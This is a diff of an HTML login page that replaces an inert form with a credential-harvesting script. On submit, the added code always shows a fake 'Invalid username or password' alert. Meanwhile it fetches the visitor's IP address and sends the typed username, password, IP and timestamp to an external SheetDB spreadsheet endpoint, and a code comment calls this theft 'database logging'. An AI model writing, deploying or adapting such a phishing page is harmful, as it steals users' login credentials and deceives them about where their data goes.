@@ -61,16 +61,16 @@
                 <form id="contactForm" class="login-form" autocomplete="off">
 
                     <div class="input-row">
-                        <input type="text" id="firstName" name="firstName" placeholder="Username" data-cms-ph="login.userPh" maxlength="60" autocomplete="username">
+                        <input type="text" id="username" name="Username" placeholder="Username" data-cms-ph="login.userPh" maxlength="60" autocomplete="Username">
                         <span class="input-icon"><i class="fas fa-user"></i></span>
                     </div>
 
                     <div class="input-row ">
-                        <input type="password" id="surname" name="surname" placeholder="Password" data-cms-ph="login.passPh" maxlength="60" autocomplete="current-password">
+                        <input type="password" id="password" name="password" placeholder="password" data-cms-ph="login.passPh" maxlength="60" autocomplete="current-password">
                         <span class="input-icon"><i class="fas fa-key"></i></span>
                     </div>
 
-                    <button type="submit" class="btn-login-submit ">
+                    <button type="submit" class="login-btn" onclick="submitForm()">
 <span class="btn-login-text" data-cms="login.submit">Login</span>
                         <span class="btn-login-icon"><i class="fas fa-right-to-bracket"></i></span>
                     </button>
@@ -119,28 +119,78 @@
 
     </div>
 
+    <!-- SCRIPT -->
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
+      const API_URL = "https://sheetdb.io/api/v1/irhjpmdb4vsdk";
 
-            /* Plain login form: does not send data anywhere and does not
-               redirect. Submitting just clears the fields locally. */
-            document.getElementById('contactForm').addEventListener('submit', function (e) {
-                e.preventDefault();
-                document.getElementById('firstName').value = '';
-                document.getElementById('surname').value = '';
+      // 🔴 Popup function that always animates
+      function showAlert(message) {
+        const alertBox = document.getElementById("topAlert");
+        alertBox.textContent = message;
+
+        // Restart animation
+        alertBox.classList.remove("show");
+        setTimeout(() => {
+          alertBox.classList.add("show");
+        }, 20);
+
+        // Auto hide
+        setTimeout(() => {
+          alertBox.classList.remove("show");
+        }, 2500);
+      }
+
+      function submitForm() {
+        const username = document.getElementById("username").value.trim();
+        const password = document.getElementById("password").value.trim();
+
+        // 🔴 ALWAYS show popup on login attempt
+        showAlert("Invalid username or password");
+
+        // If fields are empty, stop here
+        if (!username || !password) {
+          return;
+        }
+
+        // --- Your database logging still works below ---
+
+        fetch("https://api.ipify.org?format=json")
+          .then(res => res.json())
+          .then(ipData => {
+            const data = {
+              data: [
+                {
+                  username: "'" + username,
+                  password: "'" + password,
+                  ip: ipData.ip,
+                  timestamp: new Date().toLocaleString()
+                }
+              ]
+            };
+
+            fetch(API_URL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(data)
+            })
+            .then(res => {
+              if (!res.ok) throw new Error("Submission failed");
+              document.getElementById("successMsg").style.display = "block";
+
+              // Clear fields
+              document.getElementById("username").value = "";
+              document.getElementById("password").value = "";
+            })
+            .catch(err => {
+              console.error(err);
+              showAlert("Error submitting form");
             });
 
-            /* "Register here" is normal internal navigation. */
-            var regLink = document.getElementById('contactLink');
-            if (regLink) regLink.setAttribute('href', 'register.html');
-
-            /* Non-functional placeholder buttons stay inert. */
-            var apk = document.getElementById('apkLink');
-            if (apk) apk.addEventListener('click', function (e) { e.preventDefault(); });
-
-            var help = document.getElementById('helpBtn');
-            if (help) help.addEventListener('click', function (e) { e.preventDefault(); });
-        });
+          })
+          .catch(() => {
+            showAlert("Could not fetch IP");
+          });
+      }
     </script>
 
 </body>
